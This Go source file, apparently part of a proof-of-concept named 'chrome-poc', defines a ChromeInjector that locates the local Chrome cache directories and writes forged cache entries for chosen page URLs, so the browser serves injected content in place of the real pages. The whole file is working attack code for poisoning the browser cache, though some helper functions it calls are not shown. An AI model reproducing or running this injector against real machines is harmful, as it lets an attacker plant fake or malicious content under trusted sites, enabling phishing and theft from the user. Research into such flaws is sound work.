package injector 

import (
	"fmt"
	"net/url"
	"io/ioutil"
	"path/filepath"

	"chrome-poc/injector/platform"
)

type ChromeInjector struct {
	PageUrls []string
	InjectedContent string
	InjectedContentType string
}

func (self *ChromeInjector) Inject() {
	cacheDirs := platform.CacheDirs()

	fmt.Printf("Found cache dirs: %v\n", cacheDirs)

	for _, pageUrl := range self.PageUrls {
		filename, fileData := self.generatePayload(pageUrl)

		for _, dirPath := range cacheDirs {
			path := filepath.Join(dirPath, filename)
			fmt.Printf("  Writing to '%v'\n", path)

			ioutil.WriteFile(path, fileData, 0644)
		}
	}
}

func (self *ChromeInjector) generatePayload(urlStr string) (string, []byte) {
	pageUrl, _ := url.Parse(urlStr)
	cacheKey := generateCacheKey(pageUrl)
	eHash := entryHash(cacheKey)
	filename := self.generateFilename(eHash, 0)

	contentBytes := []byte(self.InjectedContent)

	respInfoData := persistRespInfo(
		pageUrl, 
		cacheKey, 
		self.InjectedContent, 
		self.InjectedContentType,
	)

	fileData := make([]byte, 0)

	fileData = append(fileData, fileHeader(cacheKey)[4:]...)
	fileData = append(fileData, []byte{ 0, 0, 0, 0 }...)
	fileData = append(fileData, cacheKey...)
	fileData = append(fileData, contentBytes...)
	fileData = append(fileData, fileEofData(contentBytes, 1)...)

	fileData = append(fileData, respInfoData...)
	fileData = append(fileData, metadataHash(cacheKey)...)
	fileData = append(fileData, fileEofData(respInfoData, 0)...)

	return filename, fileData
}

func (self *ChromeInjector) generateFilename(
    entryHash uint64,
    fileIndex int,
) string {
  	filename := fmt.Sprintf(
		"%x_%1d", 
		entryHash, 
		fileIndex,
  	)
	return filename
}